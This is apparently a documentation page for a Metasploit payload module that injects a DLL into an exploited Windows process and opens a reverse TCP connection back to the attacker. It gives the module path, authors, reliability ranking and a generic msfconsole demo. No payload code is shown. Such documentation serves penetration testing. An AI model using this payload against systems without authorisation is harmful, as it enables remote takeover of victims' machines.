## Windows Inject DLL, Reverse TCP Stager (No NX or Win7)

Inject a custom DLL into the exploited process. Connect back 
to the attacker (No NX)


## Module Name
payload/windows/patchupdllinject/reverse_nonx_tcp

## Authors
* jt <jt@klake.org>
* skape
* vlad902





## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/patchupdllinject/reverse_nonx_tcp
msf payload(reverse_nonx_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_nonx_tcp) > set TARGET <target-id>
msf payload(reverse_nonx_tcp) > show options
   ... show and set options ...
msf payload(reverse_nonx_tcp) > run
```
    
    